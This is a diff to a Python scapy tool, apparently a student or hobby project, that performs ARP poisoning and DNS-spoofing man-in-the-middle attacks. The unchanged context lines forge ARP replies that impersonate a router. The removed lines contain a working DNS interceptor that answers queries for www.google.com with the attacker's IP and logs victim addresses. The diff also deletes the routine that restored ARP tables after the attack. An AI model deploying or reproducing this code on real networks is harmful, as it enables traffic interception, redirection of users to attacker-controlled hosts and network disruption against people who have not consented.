@@ -25,8 +25,8 @@ class Spoofer:
 
     def __init__(self, host_ip: str, target_ip: str, router_ip: str) -> None:
         """
-        Input: host_ip (str) - Host machine IP, target_ip (str) - Target machine IP,
-               router_ip (str) - Router IP address
+        Input:  host_ip (str) - Host machine IP, target_ip (str) - Target machine IP,
+                router_ip (str) - Router IP address
         Output: None
         Purpose: Initialize spoofer with network addresses
         Description: Sets up spoofer with necessary IP addresses and target MAC address
@@ -34,11 +34,11 @@ class Spoofer:
         self.__ip = host_ip
         self.__target_ip = target_ip
         self.__router_ip = router_ip
-        self.__target_mac = "1e:00:da:26:fe:10 "
+        self.__target_mac = self.get_mac(target_ip)
         self.urls: Dict[str, str] = {}
 
     def checkout(self):
-        pass   
+        pass
     
     def send_spoofed_packet(self) -> None:
         """
@@ -53,17 +53,6 @@ class Spoofer:
                     psrc=self.__router_ip)
         send(packet, verbose=False)
 
-    def restore_defaults(self, dest: str, source: str) -> None:
-        """
-        Input: dest (str) - Destination IP, source (str) - Source IP
-        Output: None
-        Purpose: Restore original ARP mappings
-        Description: Sends ARP packets to restore original network configuration
-        """
-        target_mac = self.get_mac(dest)
-        source_mac = self.get_mac(source)
-        packet = ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
-        send(packet, verbose=False)
 
     def get_mac(self, ip: str) -> str:
         """
@@ -77,87 +66,4 @@ class Spoofer:
         mac = answer[0][1].hwsrc
         return mac
 
-    def process_packet(self, packet: Any) -> None:
-        """
-        Input: packet (Any) - Network packet to process
-        Output: None
-        Purpose: Process DNS queries
-        Description: Handles DNS queries, providing spoofed responses for specific domains
-        """
-        if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
-            domain = packet[DNSQR].qname.decode().rstrip(".")
-            if domain == "www.google.com":
-                print(f"Intercepted DNS query for {domain}")
-
-                response_packet = (
-                    IP(dst=packet[IP].src, src=packet[IP].dst) /
-                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
-                    DNS(
-                        id=packet[DNS].id,
-                        qr=1,
-                        aa=1,
-                        qd=packet[DNS].qd,
-                        an=DNSRR(rrname=domain, type="A", ttl=300, rdata=self.__ip)
-                    )
-                )
-
-                send(response_packet, verbose=0)
-                record_entry(domain, self.build_dict_from_packet(packet))
-                print(f"Spoofed DNS response sent: {domain} -> {self.__ip}")
-            else:
-                response_packet = self.nslookup(domain)
-                response_packet[IP].src, response_packet[IP].dst = packet[IP].dst, packet[IP].src
-                send(response_packet, verbose=0)  # type: ignore
-
-    def forward_to_router(self) -> None:
-        """
-        Input: None
-        Output: None
-        Purpose: Perform MITM attack
-        Description: Sniffs and processes network packets during MITM attack
-        """
-        while True:
-            sniff(filter="udp port 53", prn=self.process_packet, promisc=True, store=0, timeout=4)
-            self.urls = self.get_urls()
-
-    def build_dict_from_packet(self, packet: Any) -> Dict[str,str]:
-        """
-        Input: packet (Any) - Network packet to extract data from
-        Output: PacketData - Dictionary containing packet information
-        Purpose: Extract information from packet
-        Description: Creates dictionary with timestamp and source IP from packet
-        """
-        return {
-            "Time": str(time.time()),
-            "IP": packet[IP].src
-        }
-
-    def get_urls(self) -> Dict[str, str]:
-        """
-        Input: None
-        Output: Dict[str, str] - Dictionary of URL mappings
-        Purpose: Load URL mappings
-        Description: Loads URL mappings from urls.json file
-        """
-        try:
-            with open('urls.json', "r") as f:
-                urls: Dict[str, str] = json.load(f)
-        except (json.JSONDecodeError, FileNotFoundError):
-            urls = {}
-        return urls
-
-    def nslookup(self, domain: str) -> Packet:
-        """
-        Input: domain (str) - Domain name to lookup
-        Output: Packet - DNS response packet
-        Purpose: Perform DNS lookup
-        Description: Sends DNS query and returns response packet
-        """
-        dns_query = (
-            IP(dst="8.8.8.8") /
-            UDP(dport=53, sport=randint(20000, 40000)) /
-            DNS(qdcount=1, rd=1, qd=0) /
-            DNSQR(qname=domain)
-        )
-        response_packet = sr1(dns_query, verbose=0)
-        return response_packet  # type: ignore
+    
